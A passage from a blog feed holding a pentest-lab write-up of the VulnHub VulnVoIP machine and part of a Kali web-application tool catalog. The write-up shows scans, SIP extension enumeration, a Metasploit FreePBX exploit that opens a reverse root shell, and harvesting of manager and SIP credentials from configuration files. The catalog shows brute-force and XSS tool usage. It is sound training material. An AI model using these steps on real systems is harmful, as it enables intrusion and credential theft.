<p>Fortune cookie:</p>

<blockquote><p>He that breaks a thing to find out what it is has left the path of wisdom.
  &mdash; J.R.R. Tolkien</p></blockquote>

<p><strong>Random rant</strong></p>

<p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>

<p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - VulnVoIP]]></title>
    <link href="http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/"/>
    <updated>2014-10-07T19:07:46+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip</id>
    <content type="html"><![CDATA[<p>I found a very interesting virtual machine on VulnHub that focuses on VoIP vulnerabilities. Since I haven&rsquo;t seen any other VoIP resources, I thought it would be great to give this a try.</p>

<blockquote><p>VulnVoIP is based on a relatively old AsteriskNOW distribution and has a number of
weaknesses. The aim is to locate VoIP users, crack their passwords and gain access
to the Support account voicemail.</p></blockquote>

<!-- more -->


<p>The IP of the target machine is 192.168.80.131. Here are the results of the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.131</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-07 19:45 EEST
Nmap scan report for 192.168.80.131
Host is up (0.00023s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 1f:e2:e8:9e:2c:f8:31:39:36:f7:1d:aa:77:5e:ac:76 (DSA)
|<em>  2048 38:a4:9d:29:8a:11:9d:e1:13:5d:5e:6d:76:a6:63:76 (RSA)
53/tcp   open  domain     dnsmasq 2.45
| dns-nsid:
|</em>  bind.version: dnsmasq-2.45
80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
| http-robots.txt: 1 disallowed entry
|</em>/
|<em>http-title: FreePBX
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            966/udp  status
|</em>  100024  1            969/tcp  status
969/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
4445/tcp open  upnotifyp?
5038/tcp open  asterisk   Asterisk Call Manager 1.1
MAC Address: 00:0C:29:84:8C:CC (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.18 &ndash; 2.6.32
```</p>

<p>Let&rsquo;s look at that DNS server first:</p>

<blockquote><p>dnsmasq is a lightweight DNS, TFTP and DHCP server. It is intended to provide coupled DNS and DHCP service to a LAN.</p>

<p>Dnsmasq accepts DNS queries and either answers them from a small, local, cache or forwards them to a real, recursive, DNS server. It loads the
contents of /etc/hosts so that local hostnames which do not appear in the global DNS can be resolved and also answers DNS queries for DHCP
configured hosts.</p>

<p>The dnsmasq DHCP server supports static address assignments and multiple networks. It automatically sends a sensible default set of DHCP options,
and can be configured to send any desired set of DHCP options, including vendor-encapsulated options. It includes a secure, read-only, TFTP server
to allow net/PXE boot of DHCP hosts and also supports BOOTP.</p>

<p>Dnsmasq supports IPv6 for DNS, but not DHCP.</p></blockquote>

<p>There is a Heap Overflow and Null-pointer Dereference vulnerability affecting the TFTP server component:</p>

<p><strong>CVE-2009-2957</strong></p>

<blockquote><p>A vulnerability has been found that may allow an attacker to execute arbitrary code on
servers or home routers running dnsmasq with the TFTP service
enabled (&lsquo;&mdash;enable-tfp&rsquo;). This service is not enabled by default on most
distributions; in particular it is not enabled by default on OpenWRT or
DD-WRT. Chances of successful exploitation increase when a long
directory prefix is used for TFTP. Code will be executed with the
privileges of the user running dnsmasq, which is normally a
non-privileged one.</p>

<p>Additionally there is a potential DoS attack to the TFTP service by
exploiting a null-pointer dereference vulnerability.</p></blockquote>

<p>I wasn&rsquo;t able to exploit this though, so moving on.</p>

<p>Navigating to the web page, we see two links, for Voicemail &amp; Recordings (ARI) and FreePBX Administration. The administration page requires HTTP authentication, and the other one is a login portal.</p>

<p>A Nessus scan revealed that the Asterisk Recording Interface uses a default set of credentials for the administrator&rsquo;s account: <em>admin</em>/<em>ari_password</em>, on the URL <a href="http://192.168.80.131/recordings/index.php">http://192.168.80.131/recordings/index.php</a> . I didn&rsquo;t find anything useful even after logging in. These credentials didn&rsquo;t work on the admin page at <a href="http://192.168.80.131/admin/config.php">http://192.168.80.131/admin/config.php</a> , but I was able to glean the FreePBX version from the webpage (2.7.0.0). Might come in handy later!</p>

<p>Since this is my first time doing anything remotely related to VoIP, I had some googling and reading to do. For a while I just digressed from the main goal of hacking this machine to burying myself in the Session Initiation Protocol RFC (ouch!), and 2 books: <a href="http://www.amazon.com/Hacking-Exposed-VoIP-Security-Solutions/dp/0072263644">Hacking Exposed VoIP: Voice Over IP Security Secrets &amp; Solutions</a> and <a href="http://www.amazon.com/Hacking-VoIP-Protocols-Attacks-Countermeasures/dp/1593271638">Hacking VoIP: Protocols, Attacks, and Countermeasures</a>.</p>

<p>So, a short introduction to SIP is in order:</p>

<blockquote><p> SIP is an application-layer control protocol that can establish,
modify, and terminate multimedia sessions (conferences) such as
Internet telephony calls. SIP can also invite participants to
already existing sessions, such as multicast conferences.</p>

<p>SIP employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a
particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of
HTTP, providing a readable text-based format.</p>

<p>Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in
Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port</p>

<p>SIP clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly
used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up
and tearing down voice or video calls.</p></blockquote>

<p><strong>SIP Requests</strong></p>

<ul>
<li><p>INVITE &ndash; A client is being invited to participate in a call.</p></li>
<li><p>ACK &ndash; The client has confirmed the INVITE request.</p></li>
<li><p>BYE &ndash; The call has been terminated by either the caller or callee.</p></li>
<li><p>CANCEL &ndash; Cancel any pending requests.</p></li>
<li><p>OPTIONS &ndash; Queries the server for its capabilities.</p></li>
<li><p>REGISTER &ndash; Registers the client with the server according to the address in the To header.</p></li>
<li><p>PRACK &ndash; Similar to ACK, but a provisional confirmation.</p></li>
<li><p>SUBSCRIBE &ndash; Subscribes the device for an event notification.</p></li>
<li><p>NOTIFY &ndash; Notifies all subscribers of an event.</p></li>
<li><p>PUBLISH &ndash; Publishes an event to a server.</p></li>
<li><p>INFO &ndash; Sends information in the middle of a session that doesn&rsquo;t modify the session&rsquo;s state.</p></li>
<li><p>REFER &ndash; Asks the client to issue a SIP request, typically a call transfer.</p></li>
<li><p>MESSAGE &ndash; Sends an instant message using SIP.</p></li>
<li><p>UPDATE &ndash; Modifies a session&rsquo;s state without altering the dialog state.</p></li>
</ul>


<p>And, a little about Asterisk and FreePBX:</p>

<blockquote><p>Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to
one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol
(VoIP) services.</p>

<p>FreePBX is an open source GUI that controls and manages Asterisk</p></blockquote>

<p>I found an awesome tool suite for this challenge: <a href="https://code.google.com/p/sipvicious/">SIPVicious</a></p>

<blockquote><p>SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:</p>

<p>svmap &ndash; this is a sip scanner. Lists SIP devices found on an IP range</p>

<p>svwar &ndash; identifies active extensions on a PBX</p>

<p>svcrack &ndash; an online password cracker for SIP PBX</p>

<p>svreport &ndash; manages sessions and exports reports to various formats</p>

<p>svcrash &ndash; attempts to stop unauthorized svwar and svcrack scans</p></blockquote>

<p>Let&rsquo;s get started then!</p>

<p>``` plain
./svmap.py 192.168.80.1/24</p>

<h2>| SIP Device          | User Agent            | Fingerprint |</h2>

<p>| 192.168.80.131:5060 | Asterisk PBX 1.6.2.11 | disabled    |
```</p>

<p>Now we also have the Asterisk version. Next, we need to find valid extensions (it took a while of trial and error to get meaningful information on this one):</p>

<p>``` plain
./svwar.py -D -m INVITE 192.168.80.131
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected
WARNING:TakeASip:extension &lsquo;100&rsquo; probably exists but the response is unexpected</p>

<h2>| Extension | Authentication |</h2>

<p>| 201       | reqauth        |
| 200       | reqauth        |
| 2000      | reqauth        |
| 102       | reqauth        |
| 100       | weird          |
| 101       | reqauth        |
```</p>

<p>The -D option enables scanning for default extensions, and the -m option specifies a request method (INVITE indicates that a client is being invited to participate in a call session.)</p>

<p>If you read the VM description on VulnHub, you probably remember that it mentions an easy way to get root to the machine. I found an exploit for that in Metasploit, more info here: <a href="http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/">http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/</a></p>

<p>``` plain
use exploit/unix/http/freepbx_callmenum</p>

<p>msf exploit(freepbx_callmenum) > show options</p>

<p>Module options (exploit/unix/http/freepbx_callmenum):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   EXTENSION  2000-2001        yes       A range of Local extension numbers
   Proxies                     no        Use a proxy chain
   RHOST      192.168.80.131   yes       The target address
   RPORT      80               yes       The target port
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (generic/shell_reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.80.130   yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic Target
```</p>

<p>I specified the extension to match one of those that we previously discovered. And the machine belongs to us now!</p>

<p>``` plain
msf exploit(freepbx_callmenum) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.80.130:4444
[</em>] 192.168.80.131:80 &ndash; Sending evil request with range 2000
[<em>] 192.168.80.131:80 &ndash; Sending evil request with range 2001
[</em>] Command shell session 1 opened (192.168.80.130:4444 &ndash;> 192.168.80.131:47268) at 2014-10-14 14:42:29 +0300</p>

<p>whoami
root
```</p>

<p>But we are not done. We still have to find the usernames and passwords, and get the voicemail from the Support account. I googled a bit for a helpful configuration file, which turned out to be the <code>amportal.conf</code> file:</p>

<p>``` plain
cat /etc/amportal.conf</p>

<h1>This file is part of FreePBX.</h1>

<p>#</p>

<h1>FreePBX is free software: you can redistribute it and/or modify</h1>

<h1>it under the terms of the GNU General Public License as published by</h1>

<h1>the Free Software Foundation, either version 2 of the License, or</h1>

<h1>(at your option) any later version.</h1>

<p>#</p>

<h1>FreePBX is distributed in the hope that it will be useful,</h1>

<h1>but WITHOUT ANY WARRANTY; without even the implied warranty of</h1>

<h1>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</h1>

<h1>GNU General Public License for more details.</h1>

<p>#</p>

<h1>You should have received a copy of the GNU General Public License</h1>

<h1>along with FreePBX.  If not, see <a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a>.</h1>

<p>#</p>

<h1>This file contains settings for components of the Asterisk Management Portal</h1>

<h1>Spaces are not allowed!</h1>

<h1>Run /usr/src/AMP/apply_conf.sh after making changes to this file</h1>

<h1>AMPDBHOST: the host to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBHOST=localhost</p>

<h1>AMPDBUSER: the user to connect to the database named &lsquo;asterisk&rsquo;</h1>

<p>AMPDBUSER=freepbx</p>

<h1>AMPDBENGINE: the type of database to use</h1>

<p>AMPDBENGINE=mysql</p>

<h1>AMPDBPASS: the password for AMPDBUSER</h1>

<p>AMPDBPASS=fpbx</p>

<h1>AMPENGINE: the telephony backend engine to use</h1>

<p>AMPENGINE=asterisk</p>

<h1>AMPMGRUSER: the user to access the Asterisk manager interface</h1>

<p>AMPMGRUSER=admin</p>

<h1>AMPMGRPASS: the password for AMPMGRUSER</h1>

<p>AMPMGRPASS=amp111
&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;.</p>

<h1>AUTHTYPE: authentication type to use for web admin</h1>

<h1>If type set to &lsquo;database&rsquo;, the primary AMP admin credentials will be the AMPDBUSER/AMPDBPASS above</h1>

<h1>valid: none, database</h1>

<p>AUTHTYPE=database</p>

<p>```</p>

<p>We have the username and password for the admin interface now.</p>

<p><img class="center" src="/images/pentest/vulnvoip/webadmin.png" title="&lsquo;freepbx webadmin&rsquo; &lsquo;webadmin interface&rsquo;" ></p>

<p>If we go to Panel, we can see that 2000 is the extension for the Support account. But I still couldn&rsquo;t find a way to actually listen to the voicemail message, and I don&rsquo;t have the password. But, I also have the credentials for the Asterisk Login Manager, so let&rsquo;s see if that helps. To login and authenticate to the manager, you must send a &ldquo;login&rdquo; action, with your user name and secret (password) as parameters. We can use telnet for this (don&rsquo;t forget to hit Enter twice after inputting the parameters):</p>

<p>``` plain
telnet 192.168.80.131 5038
Trying 192.168.80.131&hellip;
Connected to 192.168.80.131.
Escape character is &lsquo;^]&rsquo;.
Asterisk Call Manager/1.1
action: login
username: admin
secret: amp111</p>

<p>Response: Success
Message: Authentication accepted
```</p>

<p>For a comprehensive list of Asterisk commands, check out this <a href="http://www.voip-info.org/wiki/view/Asterisk+CLI">Asterisk CLI resource</a> and <a href="http://www.voip-info.org/wiki/view/Asterisk+manager+API">Manager Actions</a>. To list the SIP users, we have to use a &ldquo;command&rdquo; action this time. And then specify the command, which is <code>sip show users</code>:</p>

<p>``` plain
action: command
command: sip show users</p>

<p>Response: Follows
Privilege: Command
Username                   Secret           Accountcode      Def.Context      ACL  NAT     <br/>
100                                                          from-internal    Yes  Always  <br/>
101                        s3cur3                            from-internal    Yes  Always  <br/>
102                        letmein123                        from-internal    Yes  Always  <br/>
201                        secret123                         from-internal    Yes  Always  <br/>
200                        quit3s3curE123                    from-internal    Yes  Always  <br/>
2000                       password123                       from-internal    Yes  Always  <br/>
&mdash;END COMMAND&mdash;
```</p>

<p>And it was this easy to get the usernames and passwords! I should have started with that! Now it&rsquo;s possible to dial the extension and listen to the voicemail message. I just randomly chose Jitsi as a VoIP client for this task. You have to download and install the package file:</p>

<p><code>plain
wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
dpkg -i jitsi_2.5-latest_amd64.deb
</code></p>

<p>Next, create an account in Jitsi:</p>

<p><img class="center" src="/images/pentest/vulnvoip/jitsi.png" title="&lsquo;jitsi&rsquo; &lsquo;jitsi&rsquo;" ></p>

<p>However, when you make the call, it asks for a voicemail password! I went back to my shell on the machine and to googling about Asterisk voicemail paswords. The configuration file that comes to the rescue is <code>/etc/asterisk/voicemail.conf</code>.</p>

<p>``` plain
cat /etc/asterisk/voicemail.conf
[general]</p>

<h1>include vm_general.inc</h1>

<h1>include vm_email.inc</h1>

<p>[default]</p>

<p>2000 => 0000,Support,,,attach=no|saycid=no|envelope=no|delete=no
```</p>

<p>So, the password is 0000, and we can now listen to the message, which I&rsquo;ll type here for the sake of completeness (hope I got it right):</p>

<blockquote><p>&ldquo;Hey Mark, I think the support web access account has been compromised. I have changed the password to securesupport123, all one word in
lowercase. You can log on at the usual address. See you in the morning&rdquo;</p></blockquote>

<p>Well, I really liked this challenge! It made me read up about various subjects I wasn&rsquo;t familiar with, like Asterisk and SIP. I also discovered the SIPVicious suite, which should come in handy from now on. And it was a great feeling to finally hear the message at the end. Also, VoIP hacking is a very interesting topic, and I hope there will be more chances to practice and learn about it.</p>

<blockquote><p>FORTUNE PROVIDES QUESTIONS FOR THE GREAT ANSWERS: #31</p>

<p>Q:    What is the name of the world&rsquo;s oldest kamikaze pilot?</p>

<p>A:    Chicken Teriyaki.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Web Applications]]></title>
    <link href="http://chousensha.github.io/blog/2014/09/24/kali-tools-catalog-web-applications/"/>
    <updated>2014-09-24T13:35:03+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/09/24/kali-tools-catalog-web-applications</id>
    <content type="html"><![CDATA[<p>This post will focus on the Kali tools that target web applications.</p>

<!-- more -->


<h3>CMS Identification</h3>

<p><strong>blindelephant</strong></p>

<p>The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable.</p>

<p><img class="center" src="/images/kali/webapp/blindelephant.png" title="&lsquo;blindelephant&rsquo; &lsquo;blindelephant&rsquo;" ></p>

<p><strong>plecost</strong></p>

<p>Wordpress finger printer tool</p>

<p><img class="center" src="/images/kali/webapp/plecost.png" title="&lsquo;plecost&rsquo; &lsquo;plecost&rsquo;" ></p>

<p><strong>wpscan</strong></p>

<p>WPScan is a black box WordPress vulnerability scanner.</p>

<p>``` plain</p>

<hr />

<pre><code>    __          _______   _____                  
    \ \        / /  __ \ / ____|                 
     \ \  /\  / /| |__) | (___   ___  __ _ _ __  
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team 
                    Version v2.4.1
 Sponsored by the RandomStorm Open Source Initiative
</code></pre>

<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>

<hr />

<p>Help :</p>

<p>Some values are settable in a config file, see the example.conf.json</p>

<p>&mdash;update                            Update to the latest revision.
&mdash;url       | -u <target url>       The WordPress URL/domain to scan.
&mdash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
&mdash;enumerate | -e [option(s)]        Enumeration.
  option :</p>

<pre><code>u        usernames from id 1 to 10
u[10-20] usernames from id 10 to 20 (you must write [] chars)
p        plugins
vp       only vulnerable plugins
ap       all plugins (can take a long time)
tt       timthumbs
t        themes
vt       only vulnerable themes
at       all themes (can take a long time)
</code></pre>

<p>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</p>

<p>&mdash;exclude-content-based &ldquo;<regexp or string>&rdquo;</p>

<pre><code>                                Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
                                You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</code></pre>

<p>&mdash;config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
&mdash;user-agent   | -a &lt;User-Agent>    Use the specified User-Agent.
&mdash;random-agent | -r                 Use a random User-Agent.
&mdash;follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
&mdash;batch                             Never ask for user input, use the default behaviour.
&mdash;no-color                          Do not use colors in the output.
&mdash;wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specified it.</p>

<pre><code>                                Subdirectories are allowed.
</code></pre>

<p>&mdash;wp-plugins-dir <wp plugins dir>   Same thing than &mdash;wp-content-dir but for the plugins directory.</p>

<pre><code>                                If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</code></pre>

<p>&mdash;proxy &lt;[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.</p>

<pre><code>                                If no protocol is given (format host:port), HTTP will be used.
</code></pre>

<p>&mdash;proxy-auth &lt;username:password>    Supply the proxy login credentials.
&mdash;basic-auth &lt;username:password>    Set the HTTP Basic authentication.
&mdash;wordlist | -w <wordlist>          Supply a wordlist for the password bruter and do the brute.
&mdash;username | -U <username>          Only brute force the supplied username.
&mdash;threads  | -t <number of threads> The number of threads to use when multi-threading requests.
&mdash;cache-ttl       &lt;cache-ttl>       Typhoeus cache TTL.
&mdash;request-timeout &lt;request-timeout> Request Timeout.
&mdash;connect-timeout &lt;connect-timeout> Connect Timeout.
&mdash;max-threads     &lt;max-threads>     Maximum Threads.
&mdash;help     | -h                     This help screen.
&mdash;verbose  | -v                     Verbose output.</p>

<p>Examples :</p>

<p>-Further help &hellip;
ruby ./wpscan.rb &mdash;help</p>

<p>-Do &lsquo;non-intrusive&rsquo; checks &hellip;
ruby ./wpscan.rb &mdash;url www.example.com</p>

<p>-Do wordlist password brute force on enumerated users using 50 threads &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;threads 50</p>

<p>-Do wordlist password brute force on the &lsquo;admin&rsquo; username only &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;username admin</p>

<p>-Enumerate installed plugins &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate p</p>

<p>-Enumerate installed themes &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate t</p>

<p>-Enumerate users &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate u</p>

<p>-Enumerate installed timthumbs &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate tt</p>

<p>-Use a HTTP proxy &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy 127.0.0.1:8118</p>

<p>-Use a SOCKS5 proxy &hellip; (cURL >= v7.21.7 needed)
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy socks5://127.0.0.1:9000</p>

<p>-Use custom content directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-content-dir custom-content</p>

<p>-Use custom plugins directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-plugins-dir wp-content/custom-plugins</p>

<p>-Update &hellip;
ruby ./wpscan.rb &mdash;update</p>

<p>-Debug output &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;debug-output 2>debug.log</p>

<p>See README for further information.
```</p>

<h3>Database Exploitation</h3>

<p>Covered in the VA section</p>

<h3>IDS/IPS Identification</h3>

<p><strong>ua-tester</strong></p>

<p>This tool is designed to automatically check a given URL using a list of standard and non-standard User Agent strings provided by the user (1 per line). The results of these checks are then reported to the user for further manual analysis where required.</p>

<p><img class="center" src="/images/kali/webapp/ua-tester.png" title="&lsquo;ua-tester&rsquo; &lsquo;ua-tester&rsquo;" ></p>

<h3>Web Application Fuzzers</h3>

<p><strong>burpsuite</strong></p>

<p>Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application&rsquo;s attack surface, through to finding and exploiting security vulnerabilities.</p>

<p>Burp gives you full control, letting you combine advanced manual techniques with state-of-the-art automation, to make your work faster, more effective, and more fun.</p>

<p>Burp Suite contains the following key components:</p>

<ul>
<li><p>An intercepting Proxy, which lets you inspect and modify traffic between your browser and the target application.</p></li>
<li><p>An application-aware Spider, for crawling content and functionality.</p></li>
<li><p>An advanced web application Scanner, for automating the detection of numerous types of vulnerability.</p></li>
<li><p>An Intruder tool, for performing powerful customized attacks to find and exploit unusual vulnerabilities.</p></li>
<li><p>A Repeater tool, for manipulating and resending individual requests.</p></li>
<li><p>A Sequencer tool, for testing the randomness of session tokens.</p></li>
<li><p>The ability to save your work and resume working later.</p></li>
<li><p>Extensibility, allowing you to easily write your own plugins, to perform complex and highly customized tasks within Burp.</p></li>
</ul>


<p><img class="center" src="/images/kali/webapp/burp.png" title="&lsquo;burpsuite&rsquo; &lsquo;burp&rsquo;" ></p>

<p><strong>owasp-zap</strong></p>

<p>The OWASP Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications.</p>

<p>ZAP provides automated scanners as well as a set of tools that allow you to find security vulnerabilities manually.</p>

<p><img class="center" src="/images/kali/webapp/owasp-zap.png" title="&lsquo;owasp-zap&rsquo; &lsquo;owasp-zap&rsquo;" ></p>

<p><strong>webscarab</strong></p>

<p>WebScarab is a framework for analysing applications that communicate using the HTTP and HTTPS protocols. It is written in Java, and is thus portable to many platforms. WebScarab has several modes of operation, implemented by a number of plugins. In its most common usage, WebScarab operates as an intercepting proxy, allowing the operator to review and modify requests created by the browser before they are sent to the server, and to review and modify responses returned from the server before they are received by the browser. WebScarab is able to intercept both HTTP and HTTPS communication. The operator can also review the conversations (requests and responses) that have passed through WebScarab.</p>

<p><img class="center" src="/images/kali/webapp/webscarab.png" title="&lsquo;webscarab&rsquo; &lsquo;webscarab&rsquo;" ></p>

<p><strong>webslayer</strong></p>

<p>WebSlayer is a tool designed for brute forcing Web Applications, it can be used to discover not linked resources (directories, servlets, scripts, etc), brute force GET and POST parameters, brute force Forms parameters (User/Password), Fuzzing, etc. The tools has a payload generator and a easy and powerful results analyzer to aid the tester in all the brute force tests.</p>

<p>It&rsquo;s possible to perform attacks like:</p>

<ul>
<li>Predictable resource locator (File and directories discovery)</li>
<li>Login forms brute force</li>
<li>Session brute force</li>
<li>Parameters brute force</li>
<li>Parameter fuzzing and Injection (XSS, SQL, etc)</li>
<li>Basic and Ntml brute forcing</li>
</ul>


<p><img class="center" src="/images/kali/webapp/webslayer.png" title="&lsquo;webslayer&rsquo; &lsquo;webslayer&rsquo;" ></p>

<p><strong>websploit</strong></p>

<p>``` plain
WebSploit Advanced MITM Framework</p>

<p>[+]Autopwn &ndash; Used From Metasploit For Scan and Exploit Target Service
[+]wmap &ndash; Scan,Crawler Target Used From Metasploit wmap plugin
[+]format infector &ndash; inject reverse &amp; bind payload into file format
[+]phpmyadmin Scanner
[+]CloudFlare resolver
[+]LFI Bypasser
[+]Apache Users Scanner
[+]Dir Bruter
[+]admin finder
[+]MLITM Attack &ndash; Man Left In The Middle, XSS Phishing Attacks
[+]MITM &ndash; Man In The Middle Attack
[+]Java Applet Attack
[+]MFOD Attack Vector
[+]ARP Dos Attack
[+]Web Killer Attack
[+]Fake Update Attack
[+]Fake Access point Attack
[+]Wifi Honeypot
[+]Wifi Jammer
[+]Wifi Dos
[+]Wifi Mass De-Authentication Attack
[+]Bluetooth POD Attack
```</p>

<p><strong>wfuzz</strong></p>

<p>Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.</p>

<p><img class="center" src="/images/kali/webapp/wfuzz.png" title="&lsquo;wfuzz&rsquo; &lsquo;wfuzz&rsquo;" ></p>

<p><strong>xsser</strong></p>

<p>Cross Site &ldquo;Scripter&rdquo; is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications. It contains several options to try to bypass certain filters, and various special techniques of code injection.</p>

<p>``` plain
Usage:</p>

<p>xsser [OPTIONS] [-u <url> |-i <file> |-d <dork>] [-g <get> |-p <post> |-c <crawl>] [Request(s)] [Vector(s)] [Bypasser(s)] [Technique(s)] [Final Injection(s)]</p>

<p>Cross Site &ldquo;Scripter&rdquo; is an automatic -framework- to detect, exploit and
report XSS vulnerabilities in web-based applications.</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  -s, &mdash;statistics      show advanced statistics output results
  -v, &mdash;verbose         active verbose mode output results
  &mdash;gtk                 launch XSSer GTK Interface (Wizard included!)</p>

<p>  <em>Special Features</em>:</p>

<pre><code>You can choose Vector(s) and Bypasser(s) to inject code with this
extra special features:

--imx=IMX           create a false image with XSS code embedded
--fla=FLASH         create a false .swf file with XSS code embedded
</code></pre>

<p>  <em>Select Target(s)</em>:</p>

<pre><code>At least one of these options has to be specified to set the source to
get target(s) urls from. You need to choose to run XSSer:

-u URL, --url=URL   Enter target(s) to audit
-i READFILE         Read target urls from a file
-d DORK             Process search engine dork results as target urls
--De=DORK_ENGINE    Search engine to use for dorking (bing, altavista,
                    yahoo, baidu, yandex, youdao, webcrawler, google, etc.
                    See dork.py file to check for available engines)
</code></pre>

<p>  <em>Select type of HTTP/HTTPS Connection(s)</em>:</p>

<pre><code>These options can be used to specify which parameter(s) we want to use
like payload to inject code.

-g GETDATA          Enter payload to audit using GET (ex: '/menu.php?q=')
-p POSTDATA         Enter payload to audit using POST (ex: 'foo=1&amp;bar=')
-c CRAWLING         Number of urls to crawl on target(s): 1-99999
--Cw=CRAWLER_WIDTH  Deeping level of crawler: 1-5
--Cl                Crawl only local target(s) urls (default TRUE)
</code></pre>

<p>  <em>Configure Request(s)</em>:</p>

<pre><code>These options can be used to specify how to connect to target(s)
payload(s). You can choose multiple:

--cookie=COOKIE     Change your HTTP Cookie header
--drop-cookie       Ignore Set-Cookie header from response
--user-agent=AGENT  Change your HTTP User-Agent header (default SPOOFED)
--referer=REFERER   Use another HTTP Referer header (default NONE)
--xforw             Set your HTTP X-Forwarded-For with random IP values
--xclient           Set your HTTP X-Client-IP with random IP values
--headers=HEADERS   Extra HTTP headers newline separated
--auth-type=ATYPE   HTTP Authentication type (Basic, Digest, GSS or NTLM)
--auth-cred=ACRED   HTTP Authentication credentials (name:password)
--proxy=PROXY       Use proxy server (tor: http://localhost:8118)
--ignore-proxy      Ignore system default HTTP proxy
--timeout=TIMEOUT   Select your timeout (default 30)
--retries=RETRIES   Retries when the connection timeouts (default 1)
--threads=THREADS   Maximum number of concurrent HTTP requests (default 5)
--delay=DELAY       Delay in seconds between each HTTP request (default 0)
